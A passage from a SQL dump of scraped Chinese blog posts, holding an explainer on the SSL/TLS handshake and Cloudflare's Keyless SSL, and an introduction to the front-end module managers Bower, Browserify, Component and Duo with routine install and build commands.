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" style="border: 0;" /> weibo</a></li>\n<li>Feed订阅： <a href="http://www.ruanyifeng.com/feed.html" target="_blank"><img src="data:image/gif;base64,R0lGODlhFAAUANU2APV1GfmrePZ8IeR5VPq2ieNkLf7p3NpFJveCJ/NoFfibVPR1IexiJfvdzuZrNfXGuOhUEueTevaFOfzIpNxDGeZZJNU6IOubifiVTfOnid1aLuZpLOFSJf/28vJtIvGcefaLSd5kNu9iFv/z6//48//t4uFfLfNkCeJNGuGNc/rCof/+/PVxEeldI/V5KeKMbu9nIvB2OvzQtNxMKfOPXP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADYALAAAAAAUABQAAAb/QJstEjKZCsjCZsl0pIS2QWXaYsA8noVWIEAgFoNhhWNyMESi7Jbr/aZCFdRnZJAFJCwAt+vlOkwtEBk1hDUkExJ6bQJaGyYMLTQTDSOFHQF8jAseSFYiJwkuAQ2FE1xaHjBIMDAgARguJwABJIQTLJswDEgeIgSEJQQILAqVNQEiui1HHgkBhTUGCiwYtR0xLS0VJhtaEgoEBoQkGCfPNSoQY9xaCwAsCBPALgmkJA4cZN0CAAgY/PJqEIDwgVAECjM0bOAnwcAKGQJclKhRgoGDDjUeUDigkN8vQiBOfByAglSDAxw3IBCgYEU0FyJoEPpA4UGNDjMsaHDQR8EdPVYOMmQYQGHAhQgHLIRIsWAlgASsGMRBMWMGBQtYZ7yIsoBRKkhjOMxAiXJGGCEpHGxIYsSIhrcaQmy1EQQAOw==" style="border: 0;" /></a></li>\n\n</ul></div>        \n        <div><p><strong>[广告]</strong>　<a href="http://memoryhere.com/?utm_source=ruanyifeng.com" style="border: none;" target="_blank">生命链记忆网是永远在线的个人史馆，是永恒的信息载体，永久保留每个人的人生记忆和生命轨迹直至千秋万代。</a>\n</p>\n\n</div>', '2014-11-06 23:42:47', 2, '2014-11-02 07:17:54', '2014-09-20 10:33:54', 0, '[["session", 0.28554380978264327], ["\\u52a0\\u5bc6", 0.2637109994690127], ["\\u670d\\u52a1\\u5668", 0.2547845570033121], ["\\u5bf9\\u8bdd", 0.23746963042292996], ["\\u63e1\\u624b", 0.16065508678929935], ["\\u968f\\u673a\\u6570", 0.1578295160097134], ["\\u79c1\\u94a5", 0.15229003188407642], ["\\u5bc6\\u94a5", 0.14634742640302548], ["\\u5ba2\\u6237\\u7aef", 0.14258124141273884], ["Premaster", 0.13325377789856685], ["secret", 0.13325377789856685], ["ID", 0.13325377789856685], ["SSL", 0.11421752391305731], ["\\u7b97\\u6cd5", 0.09687633836609871], ["ticket", 0.09518126992754776], ["\\u516c\\u94a5", 0.09518126992754776], ["\\u9c8d\\u52c3", 0.09234150126592357], ["\\u7231\\u4e3d\\u4e1d", 0.08473392606687898], ["\\u6570\\u5b57\\u8bc1\\u4e66", 0.07614501594203821], ["CDN", 0.07614501594203821]]', NULL, NULL, '本周，CloudFlare宣布，开始提供Keyless服务，即你把网站放到它们的CDN上，不用提供自己的私钥，也能使用SSL加密链接。\n\n        \n\n我看了CloudFlare的说明（这里和这里），突然意识到这是绝好的例子，可以用来说明SSL/TLS协议的运行机制。它配有插图，很容易看懂。\n\n下面，我就用这些图片作为例子，配合我半年前写的《SSL/TLS协议运行机制的概述》，来解释SSL协议。\n\n一、SSL协议的握手过程\n\n开始加密通信之前，客户端和服务器首先必须建立连接和交换参数，这个过程叫做握手（handshake）。\n\n假定客户端叫做爱丽丝，服务器叫做鲍勃，整个握手过程可以用下图说明（点击看大图）。\n\n\n\n握手阶段分成五步。\n\n\n  第一步，爱丽丝给出协议版本号、一个客户端生成的随机数（Client random），以及客户端支持的加密方法。\n\n第二步，鲍勃确认双方使用的加密方法，并给出数字证书、以及一个服务器生成的随机数（Server random）。\n\n第三步，爱丽丝确认数字证书有效，然后生成一个新的随机数（Premaster\nsecret），并使用数字证书中的公钥，加密这个随机数，发给鲍勃。\n\n第四步，鲍勃使用自己的私钥，获取爱丽丝发来的随机数（即Premaster secret）。\n\n第五步，爱丽丝和鲍勃根据约定的加密方法，使用前面的三个随机数，生成"对话密钥"（session key），用来加密接下来的整个对话过程。\n\n\n上面的五步，画成一张图，就是下面这样。\n\n\n\n二、私钥的作用\n\n握手阶段有三点需要注意。\n\n\n  （1）生成对话密钥一共需要三个随机数。\n\n（2）握手之后的对话使用"对话密钥"加密（对称加密），服务器的公钥和私钥只用于加密和解密"对话密钥"（非对称加密），无其他作用。\n\n（3）服务器公钥放在服务器的数字证书之中。\n\n\n从上面第二点可知，整个对话过程中（握手阶段和其后的对话），服务器的公钥和私钥只需要用到一次。这就是CloudFlare能够提供Keyless服务的根本原因。\n\n某些客户（比如银行）想要使用外部CDN，加快自家网站的访问速度，但是出于安全考虑，不能把私钥交给CDN服务商。这时，完全可以把私钥留在自家服务器，只用来解密对话密钥，其他步骤都让CDN服务商去完成。\n\n\n\n上图中，银行的服务器只参与第四步，后面的对话都不再会用到私钥了。\n\n三、DH算法的握手阶段\n\n整个握手阶段都不加密（也没法加密），都是明文的。因此，如果有人窃听通信，他可以知道双方选择的加密方法，以及三个随机数中的两个。整个通话的安全，只取决于第三个随机数（Premaster secret）能不能被破解。\n\n虽然理论上，只要服务器的公钥足够长（比如2048位），那么Premaster secret可以保证不被破解。但是为了足够安全，我们可以考虑把握手阶段的算法从默认的RSA算法，改为 Diffie-Hellman算法（简称DH算法）。\n\n采用DH算法后，Premaster secret不需要传递，双方只要交换各自的参数，就可以算出这个随机数。\n\n\n\n上图中，第三步和第四步由传递Premaster secret变成了传递DH算法所需的参数，然后双方各自算出Premaster secret。这样就提高了安全性。\n\n四、session的恢复\n\n握手阶段用来建立SSL连接。如果出于某种原因，对话中断，就需要重新握手。\n\n这时有两种方法可以恢复原来的session：一种叫做session ID，另一种叫做session ticket。\n\nsession ID的思想很简单，就是每一次对话都有一个编号（session ID）。如果对话中断，下次重连的时候，只要客户端给出这个编号，且服务器有这个编号的记录，双方就可以重新使用已有的"对话密钥"，而不必重新生成一把。\n\n\n\n上图中，客户端给出session ID，服务器确认该编号存在，双方就不再进行握手阶段剩余的步骤，而直接用已有的对话密钥进行加密通信。\n\nsession ID是目前所有浏览器都支持的方法，但是它的缺点在于session ID往往只保留在一台服务器上。所以，如果客户端的请求发到另一台服务器，就无法恢复对话。session ticket就是为了解决这个问题而诞生的，目前只有Firefox和Chrome浏览器支持。\n\n\n\n上图中，客户端不再发送session ID，而是发送一个服务器在上一次对话中发送过来的session ticket。这个session ticket是加密的，只有服务器才能解密，其中包括本次对话的主要信息，比如对话密钥和加密方法。当服务器收到session ticket以后，解密后就不必重新生成对话密钥了。\n\n（完）\n\n        文档信息\n\n版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证）\n发表日期： 2014年9月20日\n更多内容：  档案  » \n  开发者手册 \n\n付费支持： 购买文集\n社交媒体： twitter， weibo\nFeed订阅： \n\n        \n        [广告]　生命链记忆网是永远在线的个人史馆，是永恒的信息载体，永久保留每个人的人生记忆和生命轨迹直至千秋万代。\n\n\n', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(15, 'http://www.ruanyifeng.com/blog/2014/09/package-management.html', '前端模块管理器简介', '<p>模块化结构已经成为网站开发的主流。</p>\n\n        <p>制作网站的主要工作，不再是自己编写各种功能，而是如何将各种不同的模块组合在一起。</p>\n\n<p><img alt="模块化结构" src="http://image.beekka.com/blog/2014/bg2014091401.jpg" title="" /></p>\n\n<p>浏览器本身并不提供模块管理的机制，为了调用各个模块，有时不得不在网页中，加入一大堆script标签。这样就使得网页体积臃肿，难以维护，还产生大量的HTTP请求，拖慢显示速度，影响用户体验。</p>\n\n<p>为了解决这个问题，前端的模块管理器（package management）应运而生。它可以轻松管理各种JavaScript脚本的依赖关系，自动加载各个模块，使得网页结构清晰合理。不夸张地说，将来<strong>所有</strong>的前端JavaScript项目，应该都会采用这种方式开发。</p>\n\n<p>最早也是最有名的前端模块管理器，非<a href="http://requirejs.org/">RequireJS</a>莫属。它采用<a href="http://requirejs.org/docs/whyamd.html">AMD格式</a>，异步加载各种模块。具体的用法，可以参考我写的<a href="http://www.ruanyifeng.com/blog/2012/11/require_js.html">教程</a>。Require.js的问题在于各种参数设置过于繁琐，不容易学习，很难完全掌握。而且，实际应用中，往往还需要在服务器端，将所有模块合并后，再统一加载，这多出了很多工作量。</p>\n\n<p><img alt="RequireJS" src="http://image.beekka.com/blog/2014/bg2014091402-1.png" title="" /></p>\n\n<p>今天，我介绍另外四种前端模块管理器：<a href="http://bower.io/">Bower</a>，<a href="http://browserify.org/">Browserify</a>，<a href="https://github.com/componentjs/component">Component</a>和<a href="http://duojs.org/">Duo</a>。它们各自都有鲜明的特点，很好地弥补了Require.js的缺陷，是前端开发的利器。</p>\n\n<p>需要说明的是，这篇文章并不是这四种模块管理器的教程。我只是想用最简单的例子，说明它们是干什么用的，使得读者有一个大致的印象，知道某一种工作有特定的工具可以完成。详细的用法，还需要参考它们各自的文档。</p>\n\n<h2>Bower</h2>\n\n<p><img alt="Bower" src="http://image.beekka.com/blog/2014/bg2014091403.jpg" title="" /></p>\n\n<p><a href="http://bower.io/">Bower</a>的主要作用是，为模块的安装、升级和删除，提供一种统一的、可维护的管理模式。</p>\n\n<p>首先，安装Bower。</p>\n\n<blockquote><pre><code class="language-bash">\n　　$ npm install -g bower\n</code></pre></blockquote>\n\n<p>然后，使用bower install命令安装各种模块。下面是一些例子。</p>\n\n<blockquote><pre><code class="language-bash">\n　　# 模块的名称\n　　$ bower install jquery\n　　# github用户名/项目名\n　　$ bower install jquery/jquery\n　　# git代码仓库地址\n　　$ bower install git://github.com/user/package.git\n　　# 模块网址\n　　$ bower install http://example.com/script.js\n</code></pre></blockquote>\n\n<p>所谓"安装"，就是将该模块（以及其依赖的模块）下载到当前目录的bower_components子目录中。下载后，就可以直接插入网页。</p>\n\n<blockquote><pre><code class="language-markup">\n　　&lt;script src="/bower_componets/jquery/dist/jquery.min.js"&gt;\n</code></pre></blockquote>\n\n<p>bower update命令用于更新模块。</p>\n\n<blockquote><pre><code class="language-bash">\n　　$ bower update jquery\n</code></pre></blockquote>\n\n<p>如果不给出模块的名称，则更新所有模块。</p>\n\n<p>bower uninstall命令用于卸载模块。</p>\n\n<blockquote><pre><code class="language-bash">\n　　$ bower uninstall jquery\n</code></pre></blockquote>\n\n<p>注意，默认情况下，会连所依赖的模块一起卸载。比如，如果卸载jquery-ui，会连jquery一起卸载，除非还有别的模块依赖jquery。</p>\n\n<h2>Browserify</h2>\n\n<p><img alt="Browserify" src="http://image.beekka.com/blog/2014/bg2014091404.png" title="" /></p>\n\n<p><a href="http://browserify.org/">Browserify</a>本身不是模块管理器，只是让服务器端的CommonJS格式的模块可以运行在浏览器端。这意味着通过它，我们可以使用Node.js的npm模块管理器。所以，实际上，它等于间接为浏览器提供了npm的功能。</p>\n\n<p>首先，安装Browserify。</p>\n\n<blockquote><pre><code class="language-bash">\n　　$ npm install -g browserify\n</code></pre></blockquote>\n\n<p>然后，编写一个服务器端脚本。</p>\n\n<blockquote><pre><code class="language-javascript">\n　　var uniq = require(''uniq'');\n　　var nums = [ 5, 2, 1, 3, 2, 5, 4, 2, 0, 1 ];\n　　console.log(uniq(nums));\n</code></pre></blockquote>\n\n<p>上面代码中uniq模块是CommonJS格式，无法在浏览器中运行。这时，Browserify就登场了，将上面代码编译为浏览器脚本。</p>\n\n<blockquote><pre><code class="language-bash">\n　　$ browserify robot.js > bundle.js\n</code></pre></blockquote>\n\n<p>生成的bundle.js可以直接插入网页。</p>\n\n<blockquote><pre><code class="language-markup">\n　　&lt;script src="bundle.js"&gt;&lt;/script&gt;\n</code></pre></blockquote>\n\n<p>Browserify编译的时候，会将脚本所依赖的模块一起编译进去。这意味着，它可以将多个模块合并成一个文件。</p>\n\n<h2>Component</h2>\n\n<p><img alt="Component" src="http://image.beekka.com/blog/2014/bg2014091405.png" title="" /></p>\n\n<p><a href="https://github.com/componentjs/component">Component</a>是Express框架的作者TJ Holowaychuk开发的模块管理器。它的基本思想，是将网页所需要的各种资源（脚本、样式表、图片、字体等）编译后，放到同一个目录中（默认是build目录）。</p>\n\n<p>首先，安装Component。</p>\n\n<blockquote><pre><code class="language-bash">\n　　$ npm install -g component@1.0.0-rc5\n</code></pre></blockquote>\n\n<p>上面代码之所以需要指定Component的版本，是因为1.0版还没有正式发布。</p>\n\n<p>然后，在项目根目录下，新建一个index.html。</p>\n\n<blockquote><pre><code class="language-markup">\n　　&lt;!DOCTYPE html&gt;\n　　&lt;html&gt;\n　　  &lt;head&gt;\n　　    &lt;title&gt;Getting Started with Component&lt;/title&gt;\n　　    &lt;link rel="stylesheet" href="build/build.css"&gt;\n　　  &lt;/head&gt;\n　　  &lt;body&gt;\n　　    &lt;h1&gt;Getting Started with Component&lt;/h1&gt;\n　　    &lt;p class="blink"&gt;Woo!&lt;/p&gt;\n 　　   &lt;script src="build/build.js"&gt;&lt;/script&gt;\n　　  &lt;/body&gt;\n　　&lt;/html&gt;\n</code></pre></blockquote>\n\n<p>上面代码中的build.css和build.js，就是Component所要生成的目标文件。</p>\n\n<p>接着，在项目根目录下，新建一个component.json文件，作为项目的配置文件。</p>\n\n<blockquote><pre><code class="language-javascript">\n　　{\n　　  "name": "getting-started-with-component",\n　　  "dependencies": {\n　　    "necolas/normalize.css": "^3.0.0"\n　　  },\n　　  "scripts": ["index.js"],\n　　  "styles": ["index.css"]\n　　}\n</code></pre></blockquote>\n\n<p>上面代码中，指定JavaScript脚本和样式表的原始文件是index.js和index.css两个文件，并且样式表依赖normalize模块（不低于3.0.0版本，但不高于4.0版本）。这里需要注意，Component模块的格式是"github用户名/项目名"。</p>\n\n<p>最后，运行component build命令编译文件。</p>\n\n<blockquote><pre><code class="language-bash">\n　　$ component build\n　　   installed : necolas/normalize.css@3.0.1 in 267ms\n　　       build : resolved in 1221ms\n　　       build : files in 12ms\n　　       build : build/build.js in 76ms - 1kb\n　　       build : build/build.css in 80ms - 7kb\n</code></pre></blockquote>\n\n<p>在编译的时候，Component自动使用<a href="https://github.com/postcss/autoprefixer">autoprefixer</a>为CSS属性加上浏览器前缀。</p>\n\n<p>目前，Component似乎处于停止开发的状态，代码仓库已经将近半年没有变动过了，官方也推荐优先使用接下来介绍的Duo。</p>\n\n<h2>Duo</h2>\n\n<p><img alt="Duo" src="http://image.beekka.com/blog/2014/bg2014091406.jpg" title="" /></p>\n\n<p><a href="http://duojs.org/">Duo</a>是在Component的基础上开发的，语法和配置文件基本通用，并且借鉴了Browserify和Go语言的一些特点，相当地强大和好用。</p>\n\n<p>首先，安装Duo。</p>\n\n<blockquote><pre><code class="language-bash">\n　　$ npm install -g duo\n</code></pre></blockquote>\n\n<p>然后，编写一个本地文件index.js。</p>\n\n<blockquote><pre><code class="language-javascript">\n　　var uid = require(''matthewmueller/uid'');\n　　var fmt = require(''yields/fmt'');\n　　\n　　var msg = fmt(''Your unique ID is %s!'', uid());\n　　window.alert(msg);\n</code></pre></blockquote>\n\n<p>上面代码加载了uid和fmt两个模块，采用Component的"github用户名/项目名"格式。</p>\n\n<p>接着，编译最终的脚本文件。</p>\n\n<blockquote><pre><code class="language-bash">\n　　$ duo index.js > build.js\n</code></pre></blockquote>\n\n<p>编译后的文件可以直接插入网页。</p>\n\n<blockquote><pre><code class="language-markup">\n　　&lt;script src="build.js"&gt;&lt;/script&gt;\n</code></pre></blockquote>\n\n<p>Duo不仅可以编译JavaScript，还可以编译CSS。</p>\n\n<blockquote><pre><code class="language-css">\n　　@import ''necolas/normalize.css'';\n　　@import ''./layout/layout.css'';\n　　\n　　body {\n　　  color: teal;\n　　  background: url(''./background-image.jpg'');\n　　}\n</code></pre></blockquote>\n\n<p>编译时，Duo自动将normalize.css和layout.css，与当前样式表合并成同一个文件。</p>\n\n<blockquote><pre><code class="language-bash">\n　　$ duo index.css > build.css\n</code></pre></blockquote>\n\n<p>编译后，插入网页即可。</p>\n\n<blockquote><pre><code class="language-markup">\n　　&lt;link rel="stylesheet" href="build.css"&gt;\n</code></pre></blockquote>\n\n<p>（完）</p>\n\n        <div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr class="published" title="2014-09-14T10:13:54+08:00">2014年9月14日</abbr></li>\n<li>更多内容： <a href="http://www.ruanyifeng.com/blog/archives.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 档案</a>  » \n<a href="http://www.ruanyifeng.com/blog/javascript/"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> JavaScript</a> \n</li>\n<li>付费支持：<a href="http://www.ruanyifeng.com/blog/2014/05/my_blog_book.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAMAAAC6V+0/AAAKOWlDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanZZ3VFTXFofPvXd6oc0wAlKG3rvAANJ7k15FYZgZYCgDDjM0sSGiAhFFRJoiSFDEgNFQJFZEsRAUVLAHJAgoMRhFVCxvRtaLrqy89/Ly++Osb+2z97n77L3PWhcAkqcvl5cGSwGQyhPwgzyc6RGRUXTsAIABHmCAKQBMVka6X7B7CBDJy82FniFyAl8EAfB6WLwCcNPQM4BOB/+fpFnpfIHomAARm7M5GSwRF4g4JUuQLrbPipgalyxmGCVmvihBEcuJOWGRDT77LLKjmNmpPLaIxTmns1PZYu4V8bZMIUfEiK+ICzO5nCwR3xKxRoowlSviN+LYVA4zAwAUSWwXcFiJIjYRMYkfEuQi4uUA4EgJX3HcVyzgZAvEl3JJS8/hcxMSBXQdli7d1NqaQffkZKVwBALDACYrmcln013SUtOZvBwAFu/8WTLi2tJFRbY0tba0NDQzMv2qUP91829K3NtFehn4uWcQrf+L7a/80hoAYMyJarPziy2uCoDOLQDI3fti0zgAgKSobx3Xv7oPTTwviQJBuo2xcVZWlhGXwzISF/QP/U+Hv6GvvmckPu6P8tBdOfFMYYqALq4bKy0lTcinZ6QzWRy64Z+H+B8H/nUeBkGceA6fwxNFhImmjMtLELWbx+YKuGk8Opf3n5r4D8P+pMW5FonS+BFQY4yA1HUqQH7tBygKESDR+8Vd/6NvvvgwIH554SqTi3P/7zf9Z8Gl4iWDm/A5ziUohM4S8jMX98TPEqABAUgCKpAHykAd6ABDYAasgC1wBG7AG/iDEBAJVgMWSASpgA+yQB7YBApBMdgJ9oBqUAcaQTNoBcdBJzgFzoNL4Bq4AW6D+2AUTIBnYBa8BgsQBGEhMkSB5CEVSBPSh8wgBmQPuUG+UBAUCcVCCRAPEkJ50GaoGCqDqqF6qBn6HjoJnYeuQIPQXWgMmoZ+h97BCEyCqbASrAUbwwzYCfaBQ+BVcAK8Bs6FC+AdcCXcAB+FO+Dz8DX4NjwKP4PnEIAQERqiihgiDMQF8UeikHiEj6xHipAKpAFpRbqRPuQmMorMIG9RGBQFRUcZomxRnqhQFAu1BrUeVYKqRh1GdaB6UTdRY6hZ1Ec0Ga2I1kfboL3QEegEdBa6EF2BbkK3oy+ib6Mn0K8xGAwNo42xwnhiIjFJmLWYEsw+TBvmHGYQM46Zw2Kx8lh9rB3WH8vECrCF2CrsUexZ7BB2AvsGR8Sp4Mxw7rgoHA+Xj6vAHcGdwQ3hJnELeCm8Jt4G749n43PwpfhGfDf+On4Cv0CQJmgT7AghhCTCJkIloZVwkfCA8JJIJKoRrYmBRC5xI7GSeIx4mThGfEuSIemRXEjRJCFpB+kQ6RzpLuklmUzWIjuSo8gC8g5yM/kC+RH5jQRFwkjCS4ItsUGiRqJDYkjiuSReUlPSSXK1ZK5kheQJyeuSM1J4KS0pFymm1HqpGqmTUiNSc9IUaVNpf+lU6RLpI9JXpKdksDJaMm4ybJkCmYMyF2TGKQhFneJCYVE2UxopFykTVAxVm+pFTaIWU7+jDlBnZWVkl8mGyWbL1sielh2lITQtmhcthVZKO04bpr1borTEaQlnyfYlrUuGlszLLZVzlOPIFcm1yd2WeydPl3eTT5bfJd8p/1ABpaCnEKiQpbBf4aLCzFLqUtulrKVFS48vvacIK+opBimuVTyo2K84p6Ss5KGUrlSldEFpRpmm7KicpFyufEZ5WoWiYq/CVSlXOavylC5Ld6Kn0CvpvfRZVUVVT1Whar3qgOqCmrZaqFq+WpvaQ3WCOkM9Xr1cvUd9VkNFw08jT6NF454mXpOhmai5V7NPc15LWytca6tWp9aUtpy2l3audov2Ax2yjoPOGp0GnVu6GF2GbrLuPt0berCehV6iXo3edX1Y31Kfq79Pf9AAbWBtwDNoMBgxJBk6GWYathiOGdGMfI3yjTqNnhtrGEcZ7zLuM/5oYmGSYtJoct9UxtTbNN+02/R3Mz0zllmN2S1zsrm7+QbzLvMXy/SXcZbtX3bHgmLhZ7HVosfig6WVJd+y1XLaSsMq1qrWaoRBZQQwShiXrdHWztYbrE9Zv7WxtBHYHLf5zdbQNtn2iO3Ucu3lnOWNy8ft1OyYdvV2o/Z0+1j7A/ajDqoOTIcGh8eO6o5sxybHSSddpySno07PnU2c+c7tzvMuNi7rXM65Iq4erkWuA24ybqFu1W6P3NXcE9xb3Gc9LDzWepzzRHv6eO7yHPFS8mJ5NXvNelt5r/Pu9SH5BPtU+zz21fPl+3b7wX7efrv9HqzQXMFb0ekP/L38d/s/DNAOWBPwYyAmMCCwJvBJkGlQXlBfMCU4JvhI8OsQ55DSkPuhOqHC0J4wybDosOaw+XDX8LLw0QjjiHUR1yIVIrmRXVHYqLCopqi5lW4r96yciLaILoweXqW9KnvVldUKq1NWn46RjGHGnIhFx4bHHol9z/RnNjDn4rziauNmWS6svaxnbEd2OXuaY8cp40zG28WXxU8l2CXsTphOdEisSJzhunCruS+SPJPqkuaT/ZMPJX9KCU9pS8Wlxqae5Mnwknm9acpp2WmD6frphemja2zW7Fkzy/fhN2VAGasyugRU0c9Uv1BHuEU4lmmfWZP5Jiss60S2dDYvuz9HL2d7zmSue+63a1FrWWt78lTzNuWNrXNaV78eWh+3vmeD+oaCDRMbPTYe3kTYlLzpp3yT/LL8V5vDN3cXKBVsLBjf4rGlpVCikF84stV2a9021DbutoHt5turtn8sYhddLTYprih+X8IqufqN6TeV33zaEb9joNSydP9OzE7ezuFdDrsOl0mX5ZaN7/bb3VFOLy8qf7UnZs+VimUVdXsJe4V7Ryt9K7uqNKp2Vr2vTqy+XeNc01arWLu9dn4fe9/Qfsf9rXVKdcV17w5wD9yp96jvaNBqqDiIOZh58EljWGPft4xvm5sUmoqbPhziHRo9HHS4t9mqufmI4pHSFrhF2DJ9NProje9cv+tqNWytb6O1FR8Dx4THnn4f+/3wcZ/jPScYJ1p/0Pyhtp3SXtQBdeR0zHYmdo52RXYNnvQ+2dNt293+o9GPh06pnqo5LXu69AzhTMGZT2dzz86dSz83cz7h/HhPTM/9CxEXbvUG9g5c9Ll4+ZL7pQt9Tn1nL9tdPnXF5srJq4yrndcsr3X0W/S3/2TxU/uA5UDHdavrXTesb3Q